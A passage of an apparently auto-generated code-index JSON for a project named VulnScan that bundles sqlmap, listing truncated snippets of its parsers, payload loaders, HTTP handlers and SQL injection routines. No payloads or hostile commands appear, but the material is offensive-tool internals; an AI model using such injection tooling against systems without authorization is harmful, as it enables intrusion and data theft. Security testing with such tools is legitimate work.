        "documentation": {}
    },
    {
        "label": "Unescaper",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.unescaper",
        "description": "VulnScan.modules.sqlmap.lib.core.unescaper",
        "peekOfCode": "class Unescaper(AttribDict):\n    def escape(self, expression, quote=True, dbms=None):\n        if expression is None:\n            return expression\n        for exclude in EXCLUDE_UNESCAPE:\n            if exclude in expression:\n                return expression\n        identifiedDbms = Backend.getIdentifiedDbms()\n        if dbms is not None:\n            retVal = self[dbms](expression, quote=quote)",
        "detail": "VulnScan.modules.sqlmap.lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "unescaper",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.unescaper",
        "description": "VulnScan.modules.sqlmap.lib.core.unescaper",
        "peekOfCode": "unescaper = Unescaper()",
        "detail": "VulnScan.modules.sqlmap.lib.core.unescaper",
        "documentation": {}
    },
    {
        "label": "update",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.core.update",
        "description": "VulnScan.modules.sqlmap.lib.core.update",
        "peekOfCode": "def update():\n    if not conf.updateAll:\n        return\n    success = False\n    if TYPE == \"pip\":\n        infoMsg = \"updating sqlmap to the latest stable version from the \"\n        infoMsg += \"PyPI repository\"\n        logger.info(infoMsg)\n        debugMsg = \"sqlmap will try to update itself using 'pip' command\"\n        logger.debug(debugMsg)",
        "detail": "VulnScan.modules.sqlmap.lib.core.update",
        "documentation": {}
    },
    {
        "label": "Wordlist",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.core.wordlist",
        "description": "VulnScan.modules.sqlmap.lib.core.wordlist",
        "peekOfCode": "class Wordlist(six.Iterator):\n    \"\"\"\n    Iterator for looping over a large dictionaries\n    >>> from lib.core.option import paths\n    >>> isinstance(next(Wordlist(paths.SMALL_DICT)), six.binary_type)\n    True\n    >>> isinstance(next(Wordlist(paths.WORDLIST)), six.binary_type)\n    True\n    \"\"\"\n    def __init__(self, filenames, proc_id=None, proc_count=None, custom=None):",
        "detail": "VulnScan.modules.sqlmap.lib.core.wordlist",
        "documentation": {}
    },
    {
        "label": "MSSQLBannerHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.banner",
        "description": "VulnScan.modules.sqlmap.lib.parse.banner",
        "peekOfCode": "class MSSQLBannerHandler(ContentHandler):\n    \"\"\"\n    This class defines methods to parse and extract information from the\n    given Microsoft SQL Server banner based upon the data in XML file\n    \"\"\"\n    def __init__(self, banner, info):\n        ContentHandler.__init__(self)\n        self._banner = sanitizeStr(banner or \"\")\n        self._inVersion = False\n        self._inServicePack = False",
        "detail": "VulnScan.modules.sqlmap.lib.parse.banner",
        "documentation": {}
    },
    {
        "label": "bannerParser",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.banner",
        "description": "VulnScan.modules.sqlmap.lib.parse.banner",
        "peekOfCode": "def bannerParser(banner):\n    \"\"\"\n    This function calls a class to extract information from the given\n    DBMS banner based upon the data in XML file\n    \"\"\"\n    xmlfile = None\n    if Backend.isDbms(DBMS.MSSQL):\n        xmlfile = paths.MSSQL_XML\n    elif Backend.isDbms(DBMS.MYSQL):\n        xmlfile = paths.MYSQL_XML",
        "detail": "VulnScan.modules.sqlmap.lib.parse.banner",
        "documentation": {}
    },
    {
        "label": "cmdLineParser",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.cmdline",
        "description": "VulnScan.modules.sqlmap.lib.parse.cmdline",
        "peekOfCode": "def cmdLineParser(argv=None):\n    \"\"\"\n    This function parses the command line parameters and arguments\n    \"\"\"\n    if not argv:\n        argv = sys.argv\n    checkSystemEncoding()\n    # Reference: https://stackoverflow.com/a/4012683 (Note: previously used \"...sys.getfilesystemencoding() or UNICODE_ENCODING\")\n    _ = getUnicode(os.path.basename(argv[0]), encoding=sys.stdin.encoding)\n    usage = \"%s%s [options]\" % (\"%s \" % os.path.basename(sys.executable) if not IS_WIN else \"\", \"\\\"%s\\\"\" % _ if \" \" in _ else _)",
        "detail": "VulnScan.modules.sqlmap.lib.parse.cmdline",
        "documentation": {}
    },
    {
        "label": "configFileProxy",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.configfile",
        "description": "VulnScan.modules.sqlmap.lib.parse.configfile",
        "peekOfCode": "def configFileProxy(section, option, datatype):\n    \"\"\"\n    Parse configuration file and save settings into the configuration\n    advanced dictionary.\n    \"\"\"\n    if config.has_option(section, option):\n        try:\n            if datatype == OPTION_TYPE.BOOLEAN:\n                value = config.getboolean(section, option) if config.get(section, option) else False\n            elif datatype == OPTION_TYPE.INTEGER:",
        "detail": "VulnScan.modules.sqlmap.lib.parse.configfile",
        "documentation": {}
    },
    {
        "label": "configFileParser",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.configfile",
        "description": "VulnScan.modules.sqlmap.lib.parse.configfile",
        "peekOfCode": "def configFileParser(configFile):\n    \"\"\"\n    Parse configuration file and save settings into the configuration\n    advanced dictionary.\n    \"\"\"\n    global config\n    debugMsg = \"parsing configuration file\"\n    logger.debug(debugMsg)\n    checkFile(configFile)\n    configFP = openFile(configFile, \"rb\")",
        "detail": "VulnScan.modules.sqlmap.lib.parse.configfile",
        "documentation": {}
    },
    {
        "label": "config",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.configfile",
        "description": "VulnScan.modules.sqlmap.lib.parse.configfile",
        "peekOfCode": "config = None\ndef configFileProxy(section, option, datatype):\n    \"\"\"\n    Parse configuration file and save settings into the configuration\n    advanced dictionary.\n    \"\"\"\n    if config.has_option(section, option):\n        try:\n            if datatype == OPTION_TYPE.BOOLEAN:\n                value = config.getboolean(section, option) if config.get(section, option) else False",
        "detail": "VulnScan.modules.sqlmap.lib.parse.configfile",
        "documentation": {}
    },
    {
        "label": "FingerprintHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.handler",
        "description": "VulnScan.modules.sqlmap.lib.parse.handler",
        "peekOfCode": "class FingerprintHandler(ContentHandler):\n    \"\"\"\n    This class defines methods to parse and extract information from\n    the given DBMS banner based upon the data in XML file\n    \"\"\"\n    def __init__(self, banner, info):\n        ContentHandler.__init__(self)\n        self._banner = sanitizeStr(banner or \"\")\n        self._regexp = None\n        self._match = None",
        "detail": "VulnScan.modules.sqlmap.lib.parse.handler",
        "documentation": {}
    },
    {
        "label": "headersParser",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.headers",
        "description": "VulnScan.modules.sqlmap.lib.parse.headers",
        "peekOfCode": "def headersParser(headers):\n    \"\"\"\n    This function calls a class that parses the input HTTP headers to\n    fingerprint the back-end database management system operating system\n    and the web application technology\n    \"\"\"\n    if not kb.headerPaths:\n        kb.headerPaths = {\n            \"microsoftsharepointteamservices\": os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"sharepoint.xml\"),\n            \"server\": os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"server.xml\"),",
        "detail": "VulnScan.modules.sqlmap.lib.parse.headers",
        "documentation": {}
    },
    {
        "label": "HTMLHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.html",
        "description": "VulnScan.modules.sqlmap.lib.parse.html",
        "peekOfCode": "class HTMLHandler(ContentHandler):\n    \"\"\"\n    This class defines methods to parse the input HTML page to\n    fingerprint the back-end database management system\n    \"\"\"\n    def __init__(self, page):\n        ContentHandler.__init__(self)\n        self._dbms = None\n        self._page = (page or \"\")\n        try:",
        "detail": "VulnScan.modules.sqlmap.lib.parse.html",
        "documentation": {}
    },
    {
        "label": "htmlParser",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.html",
        "description": "VulnScan.modules.sqlmap.lib.parse.html",
        "peekOfCode": "def htmlParser(page):\n    \"\"\"\n    This function calls a class that parses the input HTML page to\n    fingerprint the back-end database management system\n    >>> from lib.core.enums import DBMS\n    >>> htmlParser(\"Warning: mysql_fetch_array() expects parameter 1 to be resource\") == DBMS.MYSQL\n    True\n    >>> threadData = getCurrentThreadData()\n    >>> threadData.lastErrorPage = None\n    \"\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.parse.html",
        "documentation": {}
    },
    {
        "label": "cleanupVals",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "description": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "peekOfCode": "def cleanupVals(text, tag):\n    if tag == \"clause\" and '-' in text:\n        text = re.sub(r\"(\\d+)-(\\d+)\", lambda match: ','.join(str(_) for _ in xrange(int(match.group(1)), int(match.group(2)) + 1)), text)\n    if tag in (\"clause\", \"where\"):\n        text = text.split(',')\n    if hasattr(text, \"isdigit\") and text.isdigit():\n        text = int(text)\n    elif isinstance(text, list):\n        count = 0\n        for _ in text:",
        "detail": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "documentation": {}
    },
    {
        "label": "parseXmlNode",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "description": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "peekOfCode": "def parseXmlNode(node):\n    for element in node.findall(\"boundary\"):\n        boundary = AttribDict()\n        for child in element:\n            if child.text:\n                values = cleanupVals(child.text, child.tag)\n                boundary[child.tag] = values\n            else:\n                boundary[child.tag] = None\n        conf.boundaries.append(boundary)",
        "detail": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "documentation": {}
    },
    {
        "label": "loadBoundaries",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "description": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "peekOfCode": "def loadBoundaries():\n    \"\"\"\n    Loads boundaries from XML\n    >>> conf.boundaries = []\n    >>> loadBoundaries()\n    >>> len(conf.boundaries) > 0\n    True\n    \"\"\"\n    try:\n        doc = et.parse(paths.BOUNDARIES_XML)",
        "detail": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "documentation": {}
    },
    {
        "label": "loadPayloads",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "description": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "peekOfCode": "def loadPayloads():\n    \"\"\"\n    Loads payloads/tests from XML\n    >>> conf.tests = []\n    >>> loadPayloads()\n    >>> len(conf.tests) > 0\n    True\n    \"\"\"\n    for payloadFile in PAYLOAD_XML_FILES:\n        payloadFilePath = os.path.join(paths.SQLMAP_XML_PAYLOADS_PATH, payloadFile)",
        "detail": "VulnScan.modules.sqlmap.lib.parse.payloads",
        "documentation": {}
    },
    {
        "label": "parseSitemap",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.sitemap",
        "description": "VulnScan.modules.sqlmap.lib.parse.sitemap",
        "peekOfCode": "def parseSitemap(url, retVal=None):\n    global abortedFlag\n    if retVal is not None:\n        logger.debug(\"parsing sitemap '%s'\" % url)\n    try:\n        if retVal is None:\n            abortedFlag = False\n            retVal = OrderedSet()\n        try:\n            content = Request.getPage(url=url, raise404=True)[0] if not abortedFlag else \"\"",
        "detail": "VulnScan.modules.sqlmap.lib.parse.sitemap",
        "documentation": {}
    },
    {
        "label": "abortedFlag",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.parse.sitemap",
        "description": "VulnScan.modules.sqlmap.lib.parse.sitemap",
        "peekOfCode": "abortedFlag = None\ndef parseSitemap(url, retVal=None):\n    global abortedFlag\n    if retVal is not None:\n        logger.debug(\"parsing sitemap '%s'\" % url)\n    try:\n        if retVal is None:\n            abortedFlag = False\n            retVal = OrderedSet()\n        try:",
        "detail": "VulnScan.modules.sqlmap.lib.parse.sitemap",
        "documentation": {}
    },
    {
        "label": "forgeHeaders",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.basic",
        "description": "VulnScan.modules.sqlmap.lib.request.basic",
        "peekOfCode": "def forgeHeaders(items=None, base=None):\n    \"\"\"\n    Prepare HTTP Cookie, HTTP User-Agent and HTTP Referer headers to use when performing\n    the HTTP requests\n    \"\"\"\n    items = items or {}\n    for _ in list(items.keys()):\n        if items[_] is None:\n            del items[_]\n    headers = OrderedDict(conf.httpHeaders if base is None else base)",
        "detail": "VulnScan.modules.sqlmap.lib.request.basic",
        "documentation": {}
    },
    {
        "label": "parseResponse",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.basic",
        "description": "VulnScan.modules.sqlmap.lib.request.basic",
        "peekOfCode": "def parseResponse(page, headers, status=None):\n    \"\"\"\n    @param page: the page to parse to feed the knowledge base htmlFp\n    (back-end DBMS fingerprint based upon DBMS error messages return\n    through the web application) list and absFilePaths (absolute file\n    paths) set.\n    \"\"\"\n    if headers:\n        headersParser(headers)\n    if page:",
        "detail": "VulnScan.modules.sqlmap.lib.request.basic",
        "documentation": {}
    },
    {
        "label": "checkCharEncoding",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.basic",
        "description": "VulnScan.modules.sqlmap.lib.request.basic",
        "peekOfCode": "def checkCharEncoding(encoding, warn=True):\n    \"\"\"\n    Checks encoding name, repairs common misspellings and adjusts to\n    proper namings used in codecs module\n    >>> checkCharEncoding('iso-8858', False)\n    'iso8859-1'\n    >>> checkCharEncoding('en_us', False)\n    'utf8'\n    \"\"\"\n    if isinstance(encoding, six.binary_type):",
        "detail": "VulnScan.modules.sqlmap.lib.request.basic",
        "documentation": {}
    },
    {
        "label": "getHeuristicCharEncoding",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.basic",
        "description": "VulnScan.modules.sqlmap.lib.request.basic",
        "peekOfCode": "def getHeuristicCharEncoding(page):\n    \"\"\"\n    Returns page encoding charset detected by usage of heuristics\n    Reference: https://chardet.readthedocs.io/en/latest/usage.html\n    >>> getHeuristicCharEncoding(b\"<html></html>\")\n    'ascii'\n    \"\"\"\n    key = hash(page)\n    retVal = kb.cache.encoding[key] if key in kb.cache.encoding else detect(page[:HEURISTIC_PAGE_SIZE_THRESHOLD])[\"encoding\"]\n    kb.cache.encoding[key] = retVal",
        "detail": "VulnScan.modules.sqlmap.lib.request.basic",
        "documentation": {}
    },
    {
        "label": "decodePage",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.basic",
        "description": "VulnScan.modules.sqlmap.lib.request.basic",
        "peekOfCode": "def decodePage(page, contentEncoding, contentType, percentDecode=True):\n    \"\"\"\n    Decode compressed/charset HTTP response\n    >>> getText(decodePage(b\"<html>foo&amp;bar</html>\", None, \"text/html; charset=utf-8\"))\n    '<html>foo&bar</html>'\n    >>> getText(decodePage(b\"&#x9;\", None, \"text/html; charset=utf-8\"))\n    '\\\\t'\n    \"\"\"\n    if not page or (conf.nullConnection and len(page) < 2):\n        return getUnicode(page)",
        "detail": "VulnScan.modules.sqlmap.lib.request.basic",
        "documentation": {}
    },
    {
        "label": "processResponse",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.basic",
        "description": "VulnScan.modules.sqlmap.lib.request.basic",
        "peekOfCode": "def processResponse(page, responseHeaders, code=None, status=None):\n    kb.processResponseCounter += 1\n    page = page or \"\"\n    parseResponse(page, responseHeaders if kb.processResponseCounter < PARSE_HEADERS_LIMIT else None, status)\n    if not kb.tableFrom and Backend.getIdentifiedDbms() in (DBMS.ACCESS,):\n        kb.tableFrom = extractRegexResult(SELECT_FROM_TABLE_REGEX, page)\n    else:\n        kb.tableFrom = None\n    if conf.parseErrors:\n        msg = extractErrorMessage(page)",
        "detail": "VulnScan.modules.sqlmap.lib.request.basic",
        "documentation": {}
    },
    {
        "label": "SmartHTTPBasicAuthHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.basicauthhandler",
        "description": "VulnScan.modules.sqlmap.lib.request.basicauthhandler",
        "peekOfCode": "class SmartHTTPBasicAuthHandler(_urllib.request.HTTPBasicAuthHandler):\n    \"\"\"\n    Reference: http://selenic.com/hg/rev/6c51a5056020\n    Fix for a: http://bugs.python.org/issue8797\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        _urllib.request.HTTPBasicAuthHandler.__init__(self, *args, **kwargs)\n        self.retried_req = set()\n        self.retried_count = 0\n    def reset_retry_count(self):",
        "detail": "VulnScan.modules.sqlmap.lib.request.basicauthhandler",
        "documentation": {}
    },
    {
        "label": "ChunkedHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.chunkedhandler",
        "description": "VulnScan.modules.sqlmap.lib.request.chunkedhandler",
        "peekOfCode": "class ChunkedHandler(_urllib.request.HTTPHandler):\n    \"\"\"\n    Ensures that HTTPHandler is working properly in case of Chunked Transfer-Encoding\n    \"\"\"\n    def _http_request(self, request):\n        host = request.get_host() if hasattr(request, \"get_host\") else request.host\n        if not host:\n            raise _urllib.error.URLError(\"no host given\")\n        if request.data is not None:  # POST\n            data = request.data",
        "detail": "VulnScan.modules.sqlmap.lib.request.chunkedhandler",
        "documentation": {}
    },
    {
        "label": "comparison",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.comparison",
        "description": "VulnScan.modules.sqlmap.lib.request.comparison",
        "peekOfCode": "def comparison(page, headers, code=None, getRatioValue=False, pageLength=None):\n    _ = _adjust(_comparison(page, headers, code, getRatioValue, pageLength), getRatioValue)\n    return _\ndef _adjust(condition, getRatioValue):\n    if not any((conf.string, conf.notString, conf.regexp, conf.code)):\n        # Negative logic approach is used in raw page comparison scheme as that what is \"different\" than original\n        # PAYLOAD.WHERE.NEGATIVE response is considered as True; in switch based approach negative logic is not\n        # applied as that what is by user considered as True is that what is returned by the comparison mechanism\n        # itself\n        retVal = not condition if kb.negativeLogic and condition is not None and not getRatioValue else condition",
        "detail": "VulnScan.modules.sqlmap.lib.request.comparison",
        "documentation": {}
    },
    {
        "label": "Connect",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.connect",
        "description": "VulnScan.modules.sqlmap.lib.request.connect",
        "peekOfCode": "class Connect(object):\n    \"\"\"\n    This class defines methods used to perform HTTP requests\n    \"\"\"\n    @staticmethod\n    def _getPageProxy(**kwargs):\n        try:\n            if (len(inspect.stack()) > sys.getrecursionlimit() // 2):   # Note: https://github.com/sqlmapproject/sqlmap/issues/4525\n                warnMsg = \"unable to connect to the target URL\"\n                raise SqlmapConnectionException(warnMsg)",
        "detail": "VulnScan.modules.sqlmap.lib.request.connect",
        "documentation": {}
    },
    {
        "label": "setHTTPHandlers",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.connect",
        "description": "VulnScan.modules.sqlmap.lib.request.connect",
        "peekOfCode": "def setHTTPHandlers():  # Cross-referenced function\n    raise NotImplementedError",
        "detail": "VulnScan.modules.sqlmap.lib.request.connect",
        "documentation": {}
    },
    {
        "label": "direct",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.direct",
        "description": "VulnScan.modules.sqlmap.lib.request.direct",
        "peekOfCode": "def direct(query, content=True):\n    select = True\n    query = agent.payloadDirect(query)\n    query = agent.adjustLateValues(query)\n    threadData = getCurrentThreadData()\n    if Backend.isDbms(DBMS.ORACLE) and query.upper().startswith(\"SELECT \") and \" FROM \" not in query.upper():\n        query = \"%s FROM DUAL\" % query\n    for sqlTitle, sqlStatements in SQL_STATEMENTS.items():\n        for sqlStatement in sqlStatements:\n            if query.lower().startswith(sqlStatement) and sqlTitle != \"SQL SELECT statement\":",
        "detail": "VulnScan.modules.sqlmap.lib.request.direct",
        "documentation": {}
    },
    {
        "label": "DNSQuery",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.dns",
        "description": "VulnScan.modules.sqlmap.lib.request.dns",
        "peekOfCode": "class DNSQuery(object):\n    \"\"\"\n    >>> DNSQuery(b'|K\\\\x01 \\\\x00\\\\x01\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x01\\\\x03www\\\\x06google\\\\x03com\\\\x00\\\\x00\\\\x01\\\\x00\\\\x01\\\\x00\\\\x00)\\\\x10\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x0c\\\\x00\\\\n\\\\x00\\\\x08O4|Np!\\\\x1d\\\\xb3')._query == b\"www.google.com.\"\n    True\n    >>> DNSQuery(b'\\\\x00')._query == b\"\"\n    True\n    \"\"\"\n    def __init__(self, raw):\n        self._raw = raw\n        self._query = b\"\"",
        "detail": "VulnScan.modules.sqlmap.lib.request.dns",
        "documentation": {}
    },
    {
        "label": "DNSServer",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.dns",
        "description": "VulnScan.modules.sqlmap.lib.request.dns",
        "peekOfCode": "class DNSServer(object):\n    \"\"\"\n    Used for making fake DNS resolution responses based on received\n    raw request\n    Reference(s):\n        https://code.activestate.com/recipes/491264-mini-fake-dns-server/\n        https://web.archive.org/web/20150418152405/https://code.google.com/p/marlon-tools/source/browse/tools/dnsproxy/dnsproxy.py\n    \"\"\"\n    def __init__(self):\n        self._check_localhost()",
        "detail": "VulnScan.modules.sqlmap.lib.request.dns",
        "documentation": {}
    },
    {
        "label": "HTTPSConnection",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "description": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "peekOfCode": "class HTTPSConnection(_http_client.HTTPSConnection):\n    \"\"\"\n    Connection class that enables usage of newer SSL protocols.\n    Reference: http://bugs.python.org/msg128686\n    NOTE: use https://check-tls.akamaized.net/ to check if (e.g.) TLS/SNI is working properly\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        # NOTE: Dirty patch for https://bugs.python.org/issue38251 / https://github.com/sqlmapproject/sqlmap/issues/4158\n        if hasattr(ssl, \"_create_default_https_context\"):\n            if None not in _contexts:",
        "detail": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "documentation": {}
    },
    {
        "label": "HTTPSHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "description": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "peekOfCode": "class HTTPSHandler(_urllib.request.HTTPSHandler):\n    def https_open(self, req):\n        return self.do_open(HTTPSConnection if ssl else _http_client.HTTPSConnection, req)",
        "detail": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "documentation": {}
    },
    {
        "label": "ssl",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "description": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "peekOfCode": "ssl = None\ntry:\n    import ssl as _ssl\n    ssl = _ssl\nexcept ImportError:\n    pass\n_protocols = filterNone(getattr(ssl, _, None) for _ in (\"PROTOCOL_TLSv1_2\", \"PROTOCOL_TLSv1_1\", \"PROTOCOL_TLSv1\", \"PROTOCOL_SSLv3\", \"PROTOCOL_SSLv23\", \"PROTOCOL_SSLv2\"))\n_lut = dict((getattr(ssl, _), _) for _ in dir(ssl) if _.startswith(\"PROTOCOL_\"))\n_contexts = {}\nclass HTTPSConnection(_http_client.HTTPSConnection):",
        "detail": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "documentation": {}
    },
    {
        "label": "_protocols",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "description": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "peekOfCode": "_protocols = filterNone(getattr(ssl, _, None) for _ in (\"PROTOCOL_TLSv1_2\", \"PROTOCOL_TLSv1_1\", \"PROTOCOL_TLSv1\", \"PROTOCOL_SSLv3\", \"PROTOCOL_SSLv23\", \"PROTOCOL_SSLv2\"))\n_lut = dict((getattr(ssl, _), _) for _ in dir(ssl) if _.startswith(\"PROTOCOL_\"))\n_contexts = {}\nclass HTTPSConnection(_http_client.HTTPSConnection):\n    \"\"\"\n    Connection class that enables usage of newer SSL protocols.\n    Reference: http://bugs.python.org/msg128686\n    NOTE: use https://check-tls.akamaized.net/ to check if (e.g.) TLS/SNI is working properly\n    \"\"\"\n    def __init__(self, *args, **kwargs):",
        "detail": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "documentation": {}
    },
    {
        "label": "_lut",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "description": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "peekOfCode": "_lut = dict((getattr(ssl, _), _) for _ in dir(ssl) if _.startswith(\"PROTOCOL_\"))\n_contexts = {}\nclass HTTPSConnection(_http_client.HTTPSConnection):\n    \"\"\"\n    Connection class that enables usage of newer SSL protocols.\n    Reference: http://bugs.python.org/msg128686\n    NOTE: use https://check-tls.akamaized.net/ to check if (e.g.) TLS/SNI is working properly\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        # NOTE: Dirty patch for https://bugs.python.org/issue38251 / https://github.com/sqlmapproject/sqlmap/issues/4158",
        "detail": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "documentation": {}
    },
    {
        "label": "_contexts",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "description": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "peekOfCode": "_contexts = {}\nclass HTTPSConnection(_http_client.HTTPSConnection):\n    \"\"\"\n    Connection class that enables usage of newer SSL protocols.\n    Reference: http://bugs.python.org/msg128686\n    NOTE: use https://check-tls.akamaized.net/ to check if (e.g.) TLS/SNI is working properly\n    \"\"\"\n    def __init__(self, *args, **kwargs):\n        # NOTE: Dirty patch for https://bugs.python.org/issue38251 / https://github.com/sqlmapproject/sqlmap/issues/4158\n        if hasattr(ssl, \"_create_default_https_context\"):",
        "detail": "VulnScan.modules.sqlmap.lib.request.httpshandler",
        "documentation": {}
    },
    {
        "label": "getValue",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.inject",
        "description": "VulnScan.modules.sqlmap.lib.request.inject",
        "peekOfCode": "def getValue(expression, blind=True, union=True, error=True, time=True, fromUser=False, expected=None, batch=False, unpack=True, resumeValue=True, charsetType=None, firstChar=None, lastChar=None, dump=False, suppressOutput=None, expectingNone=False, safeCharEncode=True):\n    \"\"\"\n    Called each time sqlmap inject a SQL query on the SQL injection\n    affected parameter.\n    \"\"\"\n    if conf.hexConvert and expected != EXPECTED.BOOL and Backend.getIdentifiedDbms():\n        if not hasattr(queries[Backend.getIdentifiedDbms()], \"hex\"):\n            warnMsg = \"switch '--hex' is currently not supported on DBMS %s\" % Backend.getIdentifiedDbms()\n            singleTimeWarnMessage(warnMsg)\n            conf.hexConvert = False",
        "detail": "VulnScan.modules.sqlmap.lib.request.inject",
        "documentation": {}
    },
    {
        "label": "goStacked",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.inject",
        "description": "VulnScan.modules.sqlmap.lib.request.inject",
        "peekOfCode": "def goStacked(expression, silent=False):\n    if PAYLOAD.TECHNIQUE.STACKED in kb.injection.data:\n        setTechnique(PAYLOAD.TECHNIQUE.STACKED)\n    else:\n        for technique in getPublicTypeMembers(PAYLOAD.TECHNIQUE, True):\n            _ = getTechniqueData(technique)\n            if _ and \"stacked\" in _[\"title\"].lower():\n                setTechnique(technique)\n                break\n    expression = cleanQuery(expression)",
        "detail": "VulnScan.modules.sqlmap.lib.request.inject",
        "documentation": {}
    },
    {
        "label": "checkBooleanExpression",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.lib.request.inject",
        "description": "VulnScan.modules.sqlmap.lib.request.inject",
        "peekOfCode": "def checkBooleanExpression(expression, expectingNone=True):\n    return getValue(expression, expected=EXPECTED.BOOL, charsetType=CHARSET_TYPE.BINARY, suppressOutput=True, expectingNone=expectingNone)",
        "detail": "VulnScan.modules.sqlmap.lib.request.inject",
        "documentation": {}
    },
    {
        "label": "MethodRequest",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.methodrequest",
        "description": "VulnScan.modules.sqlmap.lib.request.methodrequest",
        "peekOfCode": "class MethodRequest(_urllib.request.Request):\n    \"\"\"\n    Used to create HEAD/PUT/DELETE/... requests with urllib\n    \"\"\"\n    def set_method(self, method):\n        self.method = getText(method.upper())  # Dirty hack for Python3 (may it rot in hell!)\n    def get_method(self):\n        return getattr(self, 'method', _urllib.request.Request.get_method(self))",
        "detail": "VulnScan.modules.sqlmap.lib.request.methodrequest",
        "documentation": {}
    },
    {
        "label": "HTTPSPKIAuthHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.pkihandler",
        "description": "VulnScan.modules.sqlmap.lib.request.pkihandler",
        "peekOfCode": "class HTTPSPKIAuthHandler(_urllib.request.HTTPSHandler):\n    def __init__(self, auth_file):\n        _urllib.request.HTTPSHandler.__init__(self)\n        self.auth_file = auth_file\n    def https_open(self, req):\n        return self.do_open(self.getConnection, req)\n    def getConnection(self, host, timeout=None):\n        try:\n            # Reference: https://docs.python.org/2/library/ssl.html#ssl.SSLContext.load_cert_chain\n            return _http_client.HTTPSConnection(host, cert_file=self.auth_file, key_file=self.auth_file, timeout=conf.timeout)",
        "detail": "VulnScan.modules.sqlmap.lib.request.pkihandler",
        "documentation": {}
    },
    {
        "label": "HTTPRangeHandler",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.lib.request.rangehandler",
        "description": "VulnScan.modules.sqlmap.lib.request.rangehandler",
